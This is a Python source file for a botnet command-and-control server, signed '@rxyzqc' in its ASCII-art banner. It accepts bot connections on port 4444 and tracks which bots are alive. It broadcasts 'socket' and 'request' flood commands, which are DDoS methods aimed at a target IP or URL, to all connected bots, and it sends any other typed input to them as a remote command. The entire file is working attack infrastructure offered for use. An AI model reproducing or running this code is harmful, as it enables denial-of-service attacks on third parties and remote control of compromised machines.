import threading, socket, time, sys, os

host = "0.0.0.0"
port = 4444


class Color:
    purple = '\033[35m'
    green = '\033[32m'
    reset = '\033[0m'
    blue = '\033[96m'
    grey = '\033[90m'
    red = '\033[31m'


banner = """
                                           \033[35m_.oo.\033[90m
                   _.u[[/;:,.         \033[35m.odMMMMMM'\033[90m
                .o888UU[[[/;:-.  \033[35m.o@P^    MMM^\033[90m
               oN88888UU[[[/;::-.        \033[35mdP^\033[90m
              dNMMNN888UU[[[/;:--.   \033[35m.o@P^\033[90m
             ,MMMMMMN888UU[[/;::-. \033[35mo@^\033[90m
             NNMMMNN888UU[[[/~.\033[35mo@P^\033[90m
             888888888UU[[[/\033[35mo@^\033[90m-..
            \033[35mo\033[90mI8888UU[[[/\033[35mo@P^\033[90m:--..
         \033[35m.@^\033[90m  YUU[[[/\033[35mo@^\033[90m;::---..
       \033[35moMP\033[90m     ^/\033[35mo@P^\033[90m;:::---..
    \033[35m.dMMM    .o@^\033[90m ^;::---...
   \033[35mdMMMMMMM@^`\033[90m       `^^^^
  \033[35mYMMMUP^\033[90m
   \033[35m^^\033[90m
                     \033[35m╔═══════════════╗
                     ║\033[90m C2 By \033[96m@rxyzqc \033[35m║
                     ╚═══════════════╝
\033[0m"""

help_menu = """\033[90m
  -/-\033[35m help \033[90m      -/-
  -/-\033[35m bots \033[90m      -/-
  -/-\033[35m clear \033[90m     -/-
  -/-\033[35m methods \033[90m   -/-
  -/-\033[35m connect \033[90m   -/-
  -/-\033[35m disconnect \033[90m-/-
"""

methods = """\033[90m
  -/-\033[35m socket \033[90m -/-
  -/-\033[35m request \033[90m-/-
"""

print(banner)

if sys.platform == "linux":
    import pwd

    username = pwd.getpwuid(os.getuid())[0]
else:
    username = os.getlogin()

hostname = socket.gethostname()

local = f"\033[35m[\033[90m{username}@{hostname} \033[90m~\033[35m]\033[96m$ \033[0m"
remote = local.replace(hostname, "remote")

s = socket.socket()
s.bind((host, port))

sockets = []


def listener():
    s.listen(5)
    while True:
        c, address = s.accept()
        sockets.append(c)


def title():
    while True:
        if not sys.platform == "linux":
            os.system(f"title bots: {len(sockets)}")
            time.sleep(1)


def ping():
    global sockets

    while True:
        time.sleep(1)
        if len(sockets) > 0:
            for sock in sockets:
                try:
                    sock.send(b'ping')

                    if not sock.recv(1024).decode() == "pong":
                        sockets.remove(sock)

                except ConnectionError:
                    sockets.remove(sock)


socket_listener = threading.Thread(target=listener)
socket_listener.start()

bot = threading.Thread(target=title)
bot.start()

connection = threading.Thread(target=ping)
connection.start()


def server():
    while True:
        console = input(local)

        if console == "help":
            print(help_menu)

        elif console == "bots":
            print(f"bots: {len(sockets)}\n")

        elif console == "clear":
            clear()

        elif console == "methods":
            print(methods)

        elif console.startswith("socket"):
            print("\033[31m[-]\033[0m You are not connected\n")

        elif console.startswith("request"):
            print("\033[31m[-]\033[0m You are not connected\n")

        elif console == "disconnect":
            print("\033[31m[-]\033[0m You are not connected\n")

        elif console == "connect":
            if len(sockets) > 0:
                print("\033[32m[+]\033[0m Connection established\n")
                while 1:
                    console = input(remote)

                    if console == "help":
                        print(help_menu)

                    elif console == "bots":
                        print(f"bots: {len(sockets)}\n")

                    elif console == "clear":
                        clear()

                    elif console == "methods":
                        print(methods)

                    elif console.startswith("socket"):
                        if len(console.split()) == 4:
                            for sock in sockets:
                                sock.send(console.encode())

                        else:
                            print("Usage: socket <ip> <port> <bytes>\n")

                    elif console.startswith("request"):
                        if len(console.split()) == 3:
                            for sock in sockets:
                                sock.send(console.encode())

                        else:
                            print("Usage: request <http(s)://website.com> <bytes>\n")

                    elif console == "connect":
                        print("\033[31m[-]\033[0m You are already connected\n")

                    elif console == "disconnect":
                        print("\033[96m[*]\033[0m Connection closed\n")
                        server()

                    else:
                        for sock in sockets:
                            sock.send(console.encode())
            else:
                print("\033[31m[-]\033[0m No bots online\n")

        else:
            cmd = os.system(console)


def clear():
    if sys.platform == "linux":
        os.system("clear")
    else:
        os.system("cls")

    print(banner)


clear()
server()
